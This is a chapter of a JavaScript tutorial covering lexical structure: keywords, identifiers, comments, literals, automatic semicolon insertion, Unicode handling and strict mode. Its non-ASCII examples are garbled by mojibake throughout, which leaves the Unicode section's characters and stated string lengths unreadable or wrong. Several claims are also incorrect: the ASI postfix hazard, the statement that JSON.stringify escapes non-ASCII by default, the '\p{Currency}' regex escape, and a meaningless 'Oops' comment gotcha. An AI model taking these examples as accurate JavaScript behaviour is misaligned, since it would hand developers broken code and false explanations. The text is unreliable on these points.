# ECMAScript Full Guide
# 01-Language-Fundamentals.md

# 1 Language Fundamentals

**JavaScript's foundation rests on six pillars:** 
1. **lexical structure** (how source code is tokenized)
2. **variables and declarations** (scoping, hoisting, TDZ)
3. **data types** (primitives vs references)
4. **type system** (coercion, equality, checking)
5. **operators** (arithmetic to nullish coalescing)
6. **expressions/statements** (the building blocks of executable code).

This chapter dissects each pillar without shortcuts. We examine internal mechanics, edge cases, and the precise rules that govern JavaScript's behavior. Master these fundamentals and every advanced concept becomes tractable.

---

## 1.1 Lexical Structure

### 1.1.1 Tokens and Keywords

JavaScript source code is parsed into a sequence of **tokens**. A token is the smallest meaningful unit of code.

**Token Types:**

1. **Keywords** - Reserved words with special meaning
2. **Identifiers** - Names for variables, functions, properties
3. **Literals** - Fixed values (numbers, strings, booleans, etc.)
4. **Operators** - Symbols that perform operations (`+`, `-`, `=`, etc.)
5. **Punctuators** - Structural symbols (`{`, `}`, `;`, `,`, etc.)
6. **Whitespace** - Spaces, tabs, newlines (mostly ignored)
7. **Comments** - Code annotations (ignored by interpreter)

**Keywords (as of ES2024):**

```javascript
await       break       case        catch       class
const       continue    debugger    default     delete
do          else        enum        export      extends
false       finally     for         function    if
import      in          instanceof  new         null
return      super       switch      this        throw
true        try         typeof      var         void
while       with        yield
```

**Contextual Keywords** (reserved in specific contexts):

```javascript
as          async       from        get         let
of          set         static      target      meta
```

**Important Notes:**

- Keywords cannot be used as identifiers (variable/function names)
- Case-sensitive: `if` is a keyword, `If` is not
- Some keywords are unused but reserved for future use (e.g., `enum`)

**Examples:**

```javascript
// Valid
let userName = "John";
const _private = 42;
var $jquery = true;

// Invalid - using keywords
let if = 5;        // SyntaxError
const class = {};  // SyntaxError
var return = 10;   // SyntaxError
```

---

### 1.1.2 Reserved Words

Reserved words include **keywords** plus additional words reserved for future use or specific contexts.

**Complete Reserved Word List:**

```javascript
Current Keywords: (see 1.1.1)

Future Reserved Words (Strict Mode):
implements   interface    package      private      protected
public       static

Contextual Reserved Words:
arguments    eval         let          yield        await
async        of           target       meta

Reserved in Strict Mode Only:
let          static       implements   interface    package
private      protected    public
```

**Special Identifiers (not reserved but have special meaning):**

```javascript
undefined    NaN          Infinity     arguments    eval
```

**Critical Rules:**

1. **Never use reserved words as identifiers**, even if the interpreter allows it in sloppy mode
2. **`arguments` and `eval`** cannot be redeclared in strict mode
3. **`let`** is a reserved word in strict mode but not in sloppy mode (confusing, avoid)
4. Future reserved words may break your code in future JS versions

**Examples:**

```javascript
// Sloppy mode (non-strict)
var let = 5;           // Works (bad practice)
var implements = {};   // Works (bad practice)

// Strict mode
"use strict";
var let = 5;           // SyntaxError
var implements = {};   // SyntaxError
var public = true;     // SyntaxError

// Always problematic
var if = 10;           // SyntaxError in all modes
var class = {};        // SyntaxError in all modes
```

---

### 1.1.3 Identifiers and Naming Rules

An **identifier** is a name used to identify a variable, function, property, or label.

**Syntax Rules:**

1. **First character** must be:
    
    - Letter (a-z, A-Z)
    - Underscore (`_`)
    - Dollar sign (`$`)
    - Unicode letter (e.g., `Î±`, `ä¸­`)
2. **Subsequent characters** can be:
    
    - Letters
    - Digits (0-9)
    - Underscore (`_`)
    - Dollar sign (`$`)
    - Unicode letters/digits
3. **Case-sensitive**: `myVar`, `MyVar`, and `MYVAR` are different identifiers
    
4. **Cannot be a reserved word**
    

**Valid Identifiers:**

```javascript
// Standard ASCII
myVariable
_privateVar
$jqueryElement
userName123
camelCaseNaming
PascalCaseNaming
CONSTANT_VALUE
__proto__
$_

// Unicode (valid but not recommended)
let cafÃ© = "coffee";
let Ï€ = 3.14159;
let å¤‰æ•° = "variable in Japanese";
let Ð¸Ð¼Ñ = "name in Russian";
```

**Invalid Identifiers:**

```javascript
let 123start = 10;      // Cannot start with digit
let my-var = 5;         // Hyphen not allowed
let my var = 5;         // Space not allowed
let my.var = 5;         // Dot not allowed
let @handle = "user";   // @ not allowed
let class = {};         // Reserved word
```

**Naming Conventions (not enforced, but standard):**

```javascript
// Variables and functions: camelCase
let userName = "Alice";
function getUserData() {}

// Constants: UPPER_SNAKE_CASE (convention for primitive constants)
const MAX_SIZE = 100;
const API_KEY = "abc123";

// Classes and Constructors: PascalCase
class UserAccount {}
function Person(name) {}

// Private properties: prefix with underscore (convention, not enforced until # syntax)
this._internalValue = 42;

// Private fields (ES2022+): prefix with #
class MyClass {
  #privateField = 10;
}

// Boolean variables: prefix with is/has/can
let isActive = true;
let hasPermission = false;
let canEdit = true;

// jQuery objects: prefix with $ (convention)
let $button = $("#myButton");
```

**Special Considerations:**

```javascript
// Unicode identifiers work but avoid in most codebases
let Î» = x => x * 2;  // Works, but confusing
let à² _à²  = "disapproval"; // Works, but silly

// Identifiers can use Unicode escape sequences
let \u0061bc = 10;  // Same as: let abc = 10;

// Zero-width characters (DON'T USE - security risk)
let myVar = 1;
let my\u200BVar = 2;  // Different variable! (zero-width space)
```

**Best Practices:**

1. Use **descriptive names**: `getUserById` not `gud`
2. Be **consistent** with naming conventions
3. Avoid **single-letter names** except in tight loops (`i`, `j`, `k`)
4. Don't use **Hungarian notation** (`strName`, `intCount`) - JS is dynamically typed
5. Avoid **abbreviations** unless universally known (`btn`, `db`, `url` are okay)
6. Don't start with underscore unless indicating privacy convention
7. **Never use Unicode** tricks or unusual characters in production code

---

### 1.1.4 Comments

Comments are ignored by the JavaScript interpreter. They document code for humans.

**Types of Comments:**

#### **1. Single-Line Comments**

```javascript
// This is a single-line comment

let x = 5; // Comment after code

// Multiple single-line comments
// can be stacked
// like this
```

#### **2. Multi-Line Comments**

```javascript
/* This is a multi-line comment
   that spans multiple lines
   and can contain any text */

let y = 10; /* inline multi-line comment */ let z = 20;

/*
 * Block comment style often used for longer explanations
 * Each line starts with asterisk for readability
 * (asterisks are optional, just convention)
 */
```

#### **3. JSDoc Comments**

JSDoc is a documentation standard using special comment syntax. Used by documentation generators and IDEs for type hints and documentation.

```javascript
/**
 * Calculates the sum of two numbers
 * @param {number} a - The first number
 * @param {number} b - The second number
 * @returns {number} The sum of a and b
 * @throws {TypeError} If arguments are not numbers
 * @example
 * add(2, 3); // returns 5
 */
function add(a, b) {
  if (typeof a !== 'number' || typeof b !== 'number') {
    throw new TypeError('Arguments must be numbers');
  }
  return a + b;
}

/**
 * Represents a user in the system
 * @class
 * @param {string} name - User's name
 * @param {number} age - User's age
 */
class User {
  constructor(name, age) {
    /** @type {string} */
    this.name = name;
    
    /** @type {number} */
    this.age = age;
  }
  
  /**
   * Gets user's display name
   * @returns {string} Formatted display name
   */
  getDisplayName() {
    return `User: ${this.name}`;
  }
}

/**
 * @typedef {Object} Point
 * @property {number} x - X coordinate
 * @property {number} y - Y coordinate
 */

/**
 * @type {Point}
 */
let origin = { x: 0, y: 0 };
```

**Common JSDoc Tags:**

```javascript
/**
* @param       // Parameter description
* @returns     // Return value description
* @type        // Type of variable
* @typedef     // Custom type definition
* @property    // Object property
* @class       // Class description
* @constructor // Constructor function
* @throws      // Exceptions thrown
* @example     // Usage example
* @deprecated  // Mark as deprecated
* @author      // Author information
* @version     // Version information
* @see         // Cross-reference
* @link        // Link to resource
* @callback    // Callback function
* @async       // Async function
* @generator   // Generator function
* @private     // Private member
* @protected   // Protected member
* @public      // Public member
* @readonly    // Read-only property
* @static      // Static member
* @abstract    // Abstract method
* @override    // Override parent method
* @implements  // Implements interface
* @extends     // Extends parent
*/
```

**Comment Gotchas:**

```javascript
// Multi-line comments DO NOT nest
/* outer comment /* inner comment */ still in outer */ // ERROR!

// Comments can break code in unexpected ways
let url = "http://example.com"; // Works
let url = "http://example.com"; // Oops, this looks like: let url = "http:

// HTML-style comments (legacy, avoid)
<!-- This works but is deprecated
console.log("old school");
--> also works but don't use it

// Hashbang comments (ES2023+, for CLI scripts)
#!/usr/bin/env node
console.log("Executable script");

// Comments in JSON
// JSON does NOT support comments! This is a common mistake
{
  "name": "value",
  // "comment": "not allowed"  // Syntax Error in JSON
}
```

**Best Practices:**

1. **Explain WHY, not WHAT**: Code shows what; comments explain why
    
    ```javascript
    // Bad: Increment i
    i++;
    
    // Good: Skip the header row
    i++;
    
    // Good: Work around browser bug (link to issue)
    // Chrome 89 doesn't support X, so we use Y instead
    // See: https://bugs.chromium.org/p/chromium/issues/detail?id=123456
    ```
    
2. **Keep comments up-to-date**: Stale comments are worse than no comments
    
3. **Use TODO/FIXME/HACK markers**:
    
    ```javascript
    // TODO: Implement caching
    // FIXME: This breaks on negative numbers
    // HACK: Temporary workaround until API is fixed
    // NOTE: Important consideration
    // OPTIMIZE: Performance bottleneck
    ```
    
4. **Don't comment obvious code**:
    
    ```javascript
    // Bad
    let x = 5; // Set x to 5
    
    // Good
    let maxRetries = 5; // Max retries before timeout
    ```
    
5. **Use JSDoc for public APIs**
    
6. **Remove commented-out code** (use version control instead)
    

---

### 1.1.5 Literals

A **literal** is a fixed value directly written in source code.

#### **1. Numeric Literals**

```javascript
// Decimal (base 10)
42
3.14159
.5        // Same as 0.5
5.        // Same as 5.0
1e3       // Scientific notation: 1000
1e-3      // 0.001
2E10      // 20000000000

// Binary (base 2) - prefix 0b or 0B
0b1010    // 10 in decimal
0B11111111 // 255 in decimal

// Octal (base 8) - prefix 0o or 0O (NOT just 0 in strict mode)
0o755     // 493 in decimal
0O644     // 420 in decimal

// Legacy octal (sloppy mode only, avoid)
0755      // 493 in decimal (works in sloppy mode only)

// Hexadecimal (base 16) - prefix 0x or 0X
0xFF      // 255 in decimal
0xDEADBEEF // 3735928559
0X10      // 16 in decimal

// Numeric separators (ES2021) - for readability
1_000_000       // One million
3.141_592_653   // Pi
0b1010_0001     // Binary with separator
0xFF_FF_FF      // Hex with separator

// Special numeric values
Infinity        // Positive infinity
-Infinity       // Negative infinity
NaN             // Not a Number

// BigInt literals (ES2020) - suffix n
42n
0b1010n         // Binary BigInt
0o755n          // Octal BigInt
0xFFn           // Hex BigInt
1_000_000_000_000n // BigInt with separator
```

**Numeric Literal Gotchas:**

```javascript
// Leading zeros in sloppy mode are octal (confusing)
let x = 0123;     // 83 in decimal (sloppy mode)
"use strict";
let y = 0123;     // SyntaxError (strict mode)

// Floating point precision issues
0.1 + 0.2         // 0.30000000000000004 (not exactly 0.3)

// Multiple dots
5..toString()     // "5" (works: first dot is decimal, second is property access)
5.toString()      // SyntaxError (parsed as 5. followed by identifier)
(5).toString()    // "5" (works)

// Underscores placement
1__000            // SyntaxError (no consecutive underscores)
_1000             // Valid identifier, not a number
1000_             // SyntaxError (no trailing underscore)
0x_FF             // SyntaxError (no underscore after prefix)
```

#### **2. String Literals**

```javascript
// Single quotes
'Hello, World!'
'It\'s a beautiful day'  // Escape single quote

// Double quotes
"Hello, World!"
"He said, \"Hello\""     // Escape double quote

// Template literals (backticks) - ES6+
`Hello, World!`
`Multi-line
string`

// String interpolation with template literals
let name = "Alice";
let age = 30;
`My name is ${name} and I'm ${age} years old`

// Expression evaluation in template literals
`2 + 2 = ${2 + 2}`       // "2 + 2 = 4"
`Function result: ${Math.random()}`

// Nested template literals
`Outer ${ `Inner ${1 + 1}` } End`  // "Outer Inner 2 End"

// Tagged template literals
function tag(strings, ...values) {
  console.log(strings);  // Array of string parts
  console.log(values);   // Array of expression values
}
tag`Hello ${name}, you are ${age}`;

// Escape sequences
'\n'      // Newline
'\r'      // Carriage return
'\t'      // Tab
'\b'      // Backspace
'\f'      // Form feed
'\v'      // Vertical tab
'\0'      // Null character
'\\'      // Backslash
'\''      // Single quote
'\"'      // Double quote
'\xA9'    // Hex escape (Â©)
'\u00A9'  // Unicode escape (Â©)
'\u{1F600}' // Unicode code point escape (ðŸ˜€) - ES6+

// Raw strings (template literals)
String.raw`C:\Users\name\file.txt`  // "C:\Users\name\file.txt" (no escaping)
`C:\Users\name\file.txt`            // Escapes \U, \n, \f

// Line continuation in regular strings (old style, avoid)
"This is a very long \
string that continues \
on multiple lines"
```

**String Literal Gotchas:**

```javascript
// Line terminators not allowed in regular strings
let bad = "This
is broken";         // SyntaxError

// Use template literals for multi-line
let good = `This
is fine`;

// Octal escape sequences (deprecated in strict mode)
"use strict";
let x = "\251";     // SyntaxError in strict mode
let y = "\xA9";     // OK in all modes

// Empty strings
''                  // Empty string
""                  // Empty string
``                  // Empty string

// Comparing strings
'hello' === "hello" // true (quotes don't matter for equality)
```

#### **3. Boolean Literals**

```javascript
true
false

// NOT boolean literals (but commonly confused)
"true"              // String, not boolean
"false"             // String, not boolean
1                   // Number (truthy, but not boolean literal)
0                   // Number (falsy, but not boolean literal)
```

#### **4. Null Literal**

```javascript
null                // Represents intentional absence of value

// Typeof quirk
typeof null         // "object" (historical bug in JavaScript)

// Null vs undefined
null === undefined  // false
null == undefined   // true (loose equality)
```

#### **5. Undefined**

```javascript
undefined           // Represents uninitialized value

// Ways to get undefined
let x;              // Declared but not assigned
let obj = {};
obj.missing;        // Non-existent property
function f() {}
f();                // Function with no return

// Note: undefined is NOT a keyword, it's a global property
// (can be shadowed in sloppy mode, but don't)
function bad() {
  var undefined = 5; // Don't do this
  console.log(undefined); // 5 (confusing)
}

// Safe way to get undefined
void 0              // Always returns undefined
void(0)             // Same
```

#### **6. Array Literals**

```javascript
// Empty array
[]

// Array with elements
[1, 2, 3, 4, 5]
['a', 'b', 'c']
[1, 'two', true, null, { key: 'value' }]

// Nested arrays
[[1, 2], [3, 4], [5, 6]]

// Sparse arrays (holes)
[1, , 3]            // [1, empty, 3]
[1, , , 4]          // [1, empty, empty, 4]
[,,,]               // [empty Ã— 3]

// Trailing comma (ignored)
[1, 2, 3,]          // Same as [1, 2, 3]

// Spread in array literals
let arr1 = [1, 2];
let arr2 = [...arr1, 3, 4];  // [1, 2, 3, 4]
```

#### **7. Object Literals**

```javascript
// Empty object
{}

// Object with properties
{
  name: 'Alice',
  age: 30,
  isActive: true
}

// Property names can be identifiers, strings, or numbers
{
  identifier: 1,
  'string-key': 2,
  123: 3,
  'normal key': 4
}

// Computed property names (ES6+)
let key = 'dynamicKey';
{
  [key]: 'value',
  ['computed_' + key]: 'another value'
}

// Shorthand property names (ES6+)
let name = 'Alice';
let age = 30;
{ name, age }       // Same as { name: name, age: age }

// Method shorthand (ES6+)
{
  getName() { return this.name; }
  // Same as: getName: function() { return this.name; }
}

// Nested objects
{
  person: {
    name: 'Alice',
    address: {
      city: 'NYC'
    }
  }
}

// Spread in object literals (ES2018+)
let obj1 = { a: 1, b: 2 };
let obj2 = { ...obj1, c: 3 };  // { a: 1, b: 2, c: 3 }

// Trailing comma (allowed)
{
  name: 'Alice',
  age: 30,
}
```

#### **8. Regular Expression Literals**

```javascript
// Basic regex
/pattern/

// Regex with flags
/pattern/gi         // g = global, i = case-insensitive

// Common flags
/pattern/g          // Global search
/pattern/i          // Case-insensitive
/pattern/m          // Multi-line
/pattern/s          // Dot matches newline (ES2018)
/pattern/u          // Unicode mode (ES6)
/pattern/y          // Sticky mode (ES6)
/pattern/d          // Generate indices (ES2022)

// Regex special characters must be escaped in literals
/\./                // Literal dot
/\*/                // Literal asterisk
/\?/                // Literal question mark

// Cannot have unescaped forward slash
/http:\/\//         // Match "http://"

// Note: Division operator can look like regex
let x = 10 / 5;     // Division
let r = /5/;        // Regex

// Ambiguity resolved by context
let y = function() {} /test/;  // Syntax error (ambiguous)
```

#### **9. Template Literal Edge Cases**

```javascript
// Expression in template must be valid
`${}`               // SyntaxError
`${x`               // SyntaxError (unclosed)

// Can contain any expression
`${ function() { return 42; }() }`  // "42"
`${ (() => 'arrow')() }`            // "arrow"

// Nested templates
`outer ${ `inner ${ 'deep' }` }`    // "outer inner deep"

// Tagged templates preserve raw strings
function tag(strings, ...values) {
  console.log(strings.raw[0]);  // Raw string (no escape processing)
}
tag`C:\new\tab`;    // strings.raw[0] = "C:\\new\\tab"
```

---

### 1.1.6 Semicolons and ASI (Automatic Semicolon Insertion)

JavaScript has a mechanism called **Automatic Semicolon Insertion (ASI)** that automatically inserts semicolons in certain situations.

#### **Semicolon Rules:**

**1. Explicit Semicolons**

```javascript
let x = 5;
let y = 10;
console.log(x + y);
```

**2. Semicolons Can Be Omitted**

ASI inserts semicolons automatically in these cases:

- At the end of a line (before a line terminator)
- Before a closing brace `}`
- At the end of the program

```javascript
let x = 5  // Semicolon inserted
let y = 10 // Semicolon inserted
console.log(x + y) // Semicolon inserted
```

#### **ASI Rules (The Exact Specification):**

1. **When the next token cannot form a valid statement continuation:**
    
    ```javascript
    let a = 1
    let b = 2  // Semicolon inserted after 1
    ```
    
2. **When a line terminator is encountered after a restricted token:**
    
    - `return`, `throw`, `break`, `continue`, `yield`, `++`, `--`
    
    ```javascript
    return
    x + y      // Interpreted as: return; x + y;
    
    x
    ++
    y          // Interpreted as: x; ++y;
    ```
    
3. **When a closing brace `}` is encountered:**
    
    ```javascript
    function f() {
      return 42
    }  // Semicolon inserted after 42
    ```
    
4. **At the end of the input:**
    
    ```javascript
    let x = 5  // Semicolon inserted at end
    ```
    

#### **ASI Hazards:**

**1. Return Statement Hazard**

```javascript
// WRONG - returns undefined!
function getObject() {
  return
  {
    name: 'Alice'
  }
}
// Interpreted as:
// return;
// { name: 'Alice' };

// CORRECT
function getObject() {
  return {
    name: 'Alice'
  }
}
```

**2. Array/Object Literal Access**

```javascript
// WRONG - treated as two statements
let arr = [1, 2, 3]
[0, 1].forEach(i => console.log(i))
// Interpreted as: arr[[0, 1]].forEach(...)
// Error: Cannot read property 'forEach' of undefined

// CORRECT
let arr = [1, 2, 3];
[0, 1].forEach(i => console.log(i));
```

**3. Postfix Operators**

```javascript
let x = 5
let y = x
++y  // Interpreted as: let y = x++; y (increments x!)

// Should be:
let x = 5
let y = x;
++y
```

**4. Template Literals**

```javascript
let x = "hello"
`world`  // Interpreted as: "hello"("world")
// TypeError: "hello" is not a function

// Should be:
let x = "hello";
`world`
```

**5. Function Calls with IIFE**

```javascript
let f = function() { return 42 }
(function() { console.log("IIFE") })()
// Interpreted as: let f = function() { return 42 }(function()...)()
// Tries to call 42 as function

// Should be:
let f = function() { return 42 };
(function() { console.log("IIFE") })();
```

**6. Property Access**

```javascript
let obj = {}
[1, 2, 3].forEach(x => console.log(x))
// Interpreted as: let obj = {}[1, 2, 3].forEach(...)
// Error

// Should be:
let obj = {};
[1, 2, 3].forEach(x => console.log(x));
```

#### **When to Use Semicolons (Best Practices):**

**Use explicit semicolons if:**

- Starting a line with `[`, `(`, `` ` ``, `+`, `-`, `/`
- Working in a team (consistency)
- You want predictable behavior

**The "Defensive Semicolon" Pattern:**

```javascript
// If you omit semicolons, start these lines with semicolon
;[1, 2, 3].forEach(...)
;(function() { ... })()
;`template literal`
```

**The "Always Use Semicolons" Approach (Recommended):**

```javascript
let x = 5;
let arr = [1, 2, 3];
arr.forEach(item => console.log(item));

function f() {
  return {
    name: 'Alice'
  };
}
```

**The "Never Use Semicolons" Approach:**

```javascript
let x = 5
let arr = [1, 2, 3]
;[0, 1].forEach(i => console.log(i))  // Defensive semicolon

function f() {
  return {
    name: 'Alice'
  }
}
```

#### **Statements That Must Be Terminated:**

Even with ASI, certain patterns require thinking:

```javascript
// These always work fine with ASI
if (condition) doSomething()
while (condition) doSomething()
for (let i = 0; i < 10; i++) doSomething()

// Expression statements need care
let x = 5
x = 10  // Fine

let f = () => 42
f()  // Fine

// But:
let obj = {}
({}).toString()  // Error without semicolon after {}
```

#### **Empty Statements:**

```javascript
// Empty statement (just a semicolon)
;

// Valid but useless
if (condition);  // Empty if body
while (condition);  // Infinite empty loop (be careful)

// Useful in for loops
for (let i = 0; i < 10; i++);  // Loop body is empty
```

#### **Tool Support:**

Most linters (ESLint) can enforce semicolon style:

```javascript
// ESLint rules
"semi": ["error", "always"]   // Require semicolons
"semi": ["error", "never"]    // Forbid semicolons
```

**Bottom Line:**

- **Understand ASI** to avoid bugs
- **Be consistent** in your codebase
- **Most style guides recommend using semicolons** to avoid edge cases
- **Linters can enforce** your chosen style

---

### 1.1.7 Unicode and Character Encoding

JavaScript strings are sequences of **UTF-16 code units**.

#### **Unicode Basics:**

**Unicode** is a standard for representing text from all writing systems. Each character has a unique number called a **code point** (U+0000 to U+10FFFF).

**UTF-16** encodes code points as one or two 16-bit code units:

- **BMP (Basic Multilingual Plane)**: U+0000 to U+FFFF (single code unit)
- **Supplementary planes**: U+10000 to U+10FFFF (surrogate pair: two code units)

#### **Unicode in JavaScript:**

**1. Unicode Escape Sequences**

```javascript
// \uXXXX - 4 hex digits (BMP characters)
'\u0041'        // 'A'
'\u0048\u0069'  // 'Hi'
'\u00A9'        // 'Â©'
'\u4E2D'        // 'ä¸­' (Chinese)
'\u03B1'        // 'Î±' (Greek alpha)

// \u{X...} - code point escape (ES6+) - up to 6 hex digits
'\u{41}'        // 'A'
'\u{1F600}'     // 'ðŸ˜€' (emoji)
'\u{1F4A9}'     // 'ðŸ’©'
'\u{10FFFF}'    // Maximum code point

// Without code point escape, surrogates needed for non-BMP
'\uD83D\uDE00'  // 'ðŸ˜€' (surrogate pair)
```

**2. Unicode in Identifiers**

```javascript
// Unicode letters allowed in identifiers
let cafÃ© = 'coffee';
let Ï€ = 3.14159;
let \u0041BC = 10;  // Same as: let ABC = 10;

// Zero-width characters (security issue)
let myVar = 1;
let my\u200BVar = 2;  // Different variable! (zero-width space U+200B)
```

**3. String Length and Indexing**

JavaScript strings use UTF-16, so `length` counts code units, not characters:

```javascript
// BMP characters (1 code unit each)
'Hello'.length      // 5
'A'.length          // 1
'ä¸­'.length          // 1

// Non-BMP characters (2 code units = surrogate pair)
'ðŸ˜€'.length          // 2 (not 1!)
'ð€'.length          // 2 (mathematical bold A)

// Combining characters
'Ã©'.length          // 1 (precomposed)
'Ã©'.length          // 2 (e + combining acute accent)

// String indexing by code unit
let emoji = 'ðŸ˜€';
emoji[0]            // '\uD83D' (high surrogate, invalid character)
emoji[1]            // '\uDE00' (low surrogate, invalid character)
emoji.charAt(0)     // Same as emoji[0]

// Getting actual character (code point)
[...emoji]          // ['ðŸ˜€'] (spread operator handles code points)
Array.from(emoji)   // ['ðŸ˜€']
emoji.codePointAt(0) // 128512 (0x1F600)
```

**4. Iterating Over Strings**

```javascript
let str = 'AðŸ˜€B';

// Wrong: iterates over code units
for (let i = 0; i < str.length; i++) {
  console.log(str[i]);  // 'A', '\uD83D', '\uDE00', 'B'
}

// Correct: iterates over code points
for (let char of str) {
  console.log(char);  // 'A', 'ðŸ˜€', 'B'
}

// Also correct
[...str].forEach(char => console.log(char));  // 'A', 'ðŸ˜€', 'B'
```

**5. String Methods and Unicode**

```javascript
// charAt (code unit, old way)
'ðŸ˜€'.charAt(0)      // '\uD83D' (half character)

// codePointAt (code point, ES6+)
'ðŸ˜€'.codePointAt(0) // 128512

// charCodeAt (code unit value)
'ðŸ˜€'.charCodeAt(0)  // 55357 (0xD83D, high surrogate)
'ðŸ˜€'.charCodeAt(1)  // 56832 (0xDE00, low surrogate)

// fromCharCode (creates string from code units)
String.fromCharCode(65)              // 'A'
String.fromCharCode(0xD83D, 0xDE00)  // 'ðŸ˜€'

// fromCodePoint (creates string from code points, ES6+)
String.fromCodePoint(128512)         // 'ðŸ˜€'
String.fromCodePoint(0x1F600)        // 'ðŸ˜€'

// normalize (canonical equivalence)
let e1 = 'Ã©';      // Precomposed (U+00E9)
let e2 = 'Ã©';      // Decomposed (U+0065 U+0301)
e1 === e2          // false
e1.normalize() === e2.normalize()  // true

// Normalization forms
'Ã©'.normalize('NFC')   // Canonical composition
'Ã©'.normalize('NFD')   // Canonical decomposition
'Ã©'.normalize('NFKC')  // Compatibility composition
'Ã©'.normalize('NFKD')  // Compatibility decomposition
```

**6. Regular Expressions and Unicode**

```javascript
// Without 'u' flag: operates on code units
/^.$/.test('ðŸ˜€')           // false (. matches one code unit)
/^..$/.test('ðŸ˜€')          // true (matches both surrogates)

// With 'u' flag: operates on code points (ES6+)
/^.$/u.test('ðŸ˜€')          // true
/^..$/u.test('ðŸ˜€')         // false

// Unicode property escapes (ES2018+)
/\p{Emoji}/u.test('ðŸ˜€')    // true
/\p{Script=Greek}/u.test('Î±')  // true
/\p{Letter}/u.test('A')    // true
/\p{Number}/u.test('5')    // true
/\p{Currency}/u.test('$')  // true

// Case-insensitive with Unicode
/\u{1F600}/ui.test('ðŸ˜€')   // true
```

**7. Surrogate Pairs**

JavaScript uses UTF-16, which uses **surrogate pairs** for code points > U+FFFF:

```javascript
// High surrogate: 0xD800-0xDBFF
// Low surrogate: 0xDC00-0xDFFF

// Formula for surrogate pairs:
// Code point = (high - 0xD800) * 0x400 + (low - 0xDC00) + 0x10000

let emoji = 'ðŸ˜€';  // U+1F600
emoji.charCodeAt(0).toString(16)  // 'd83d' (high surrogate)
emoji.charCodeAt(1).toString(16)  // 'de00' (low surrogate)

// Verify:
// (0xD83D - 0xD800) * 0x400 + (0xDE00 - 0xDC00) + 0x10000
// = 0x3D * 0x400 + 0x200 + 0x10000
// = 0xF400 + 0x200 + 0x10000
// = 0x1F600 âœ“

// Detecting surrogates
function isHighSurrogate(code) {
  return code >= 0xD800 && code <= 0xDBFF;
}

function isLowSurrogate(code) {
  return code >= 0xDC00 && code <= 0xDFFF;
}
```

**8. Grapheme Clusters**

A **grapheme cluster** is what users perceive as a single character. It can be multiple code points:

```javascript
// Single code point
'A'.length              // 1

// Combining characters
'Ã©'.length              // 2 (e + combining acute)
'ðŸ‘¨â€ðŸ‘©â€ðŸ‘§â€ðŸ‘¦'.length        // 11 (family emoji with ZWJ)

// Emoji with modifiers
'ðŸ‘ðŸ½'.length            // 4 (thumbs up + skin tone modifier)

// Counting graphemes requires a library (e.g., Intl.Segmenter)
let segmenter = new Intl.Segmenter('en', { granularity: 'grapheme' });
let segments = segmenter.segment('ðŸ‘¨â€ðŸ‘©â€ðŸ‘§â€ðŸ‘¦');
[...segments].length    // 1 (one grapheme cluster)
```

**9. Source Code Encoding**

JavaScript source files should be UTF-8 encoded:

```javascript
// These work if file is UTF-8
let message = "Hello, ä¸–ç•Œ";
let greeting = "ÐŸÑ€Ð¸Ð²ÐµÑ‚";
let emoji = "ðŸ˜€";

// Can also use escape sequences
let message = "Hello, \u4E16\u754C";  // Same as "Hello, ä¸–ç•Œ"
```

**10. JSON and Unicode**

JSON requires strings to be Unicode:

```javascript
// JSON allows Unicode escape sequences
let json = '{"emoji": "\\uD83D\\uDE00"}';
JSON.parse(json)  // { emoji: 'ðŸ˜€' }

// JSON.stringify escapes non-ASCII by default
JSON.stringify({ emoji: 'ðŸ˜€' })  // '{"emoji":"ðŸ˜€"}'

// Can force ASCII-only output
JSON.stringify({ emoji: 'ðŸ˜€' }).replace(/[\u007F-\uFFFF]/g, char =>
  '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0')
)  // '{"emoji":"\\ud83d\\ude00"}'
```

#### **Best Practices:**

1. **Use code point escapes** (`\u{...}`) for clarity
2. **Use `for...of`** or spread to iterate over strings with non-BMP characters
3. **Use `.codePointAt()`** instead of `.charCodeAt()`
4. **Use `String.fromCodePoint()`** instead of `String.fromCharCode()`
5. **Use the `u` flag** in regex when working with Unicode
6. **Normalize strings** when comparing user input
7. **Be aware** that `.length` counts code units, not characters
8. **Use `Intl.Segmenter`** for accurate grapheme counting (ES2022+)
9. **Test with emoji** and non-BMP characters
10. **Ensure files are UTF-8 encoded**

---

### 1.1.8 Strict Mode

**Strict mode** is a way to opt into a restricted variant of JavaScript, which:

- Eliminates some silent errors (throws errors instead)
- Fixes mistakes that make optimization difficult
- Prohibits syntax likely to be defined in future ECMAScript versions

#### **Enabling Strict Mode:**

**1. Global Strict Mode (entire script)**

```javascript
"use strict";

// All code after this is in strict mode
let x = 10;
delete x;  // SyntaxError in strict mode
```

**2. Function-Level Strict Mode**

```javascript
function strictFunc() {
  "use strict";
  // Only this function is in strict mode
  let x = 10;
  delete x;  // SyntaxError
}

function normalFunc() {
  // This function is in sloppy mode
  let x = 10;
  delete x;  // Silent failure (returns false)
}
```

**3. Module Strict Mode (ES6+ modules)**

```javascript
// ES6 modules are ALWAYS in strict mode (automatic)
export function myFunc() {
  // Already in strict mode, no need for "use strict"
}
```

**4. Class Strict Mode**

```javascript
// Class bodies are ALWAYS in strict mode (automatic)
class MyClass {
  constructor() {
    // Already in strict mode
  }
}
```

#### **Strict Mode Changes:**

**1. Assignment to Undeclared Variables**

```javascript
// Sloppy mode
x = 10;  // Creates global variable (accidental)

// Strict mode
"use strict";
x = 10;  // ReferenceError: x is not defined
```

**2. Deleting Variables**

```javascript
// Sloppy mode
let x = 10;
delete x;  // Returns false, does nothing

// Strict mode
"use strict";
let x = 10;
delete x;  // SyntaxError
```

**3. Deleting Non-Configurable Properties**

```javascript
// Sloppy mode
delete Object.prototype;  // Returns false, silent failure

// Strict mode
"use strict";
delete Object.prototype;  // TypeError
```

**4. Duplicate Parameter Names**

```javascript
// Sloppy mode
function f(a, a, b) {  // Second 'a' shadows first
  return a;
}
f(1, 2, 3);  // Returns 2

// Strict mode
"use strict";
function f(a, a, b) {  // SyntaxError: Duplicate parameter name
  return a;
}
```

**5. Octal Literals**

```javascript
// Sloppy mode
let x = 0123;  // Octal: 83 in decimal (confusing)

// Strict mode
"use strict";
let x = 0123;  // SyntaxError
let y = 0o123; // OK: explicit octal prefix
```

**6. Octal Escape Sequences**

```javascript
// Sloppy mode
let s = "\251";  // Octal escape: Â©

// Strict mode
"use strict";
let s = "\251";  // SyntaxError
let t = "\xA9";  // OK: hex escape
```

**7. Assignment to Read-Only Properties**

```javascript
// Sloppy mode
let obj = {};
Object.defineProperty(obj, 'x', { value: 10, writable: false });
obj.x = 20;  // Silent failure

// Strict mode
"use strict";
let obj = {};
Object.defineProperty(obj, 'x', { value: 10, writable: false });
obj.x = 20;  // TypeError: Cannot assign to read only property
```

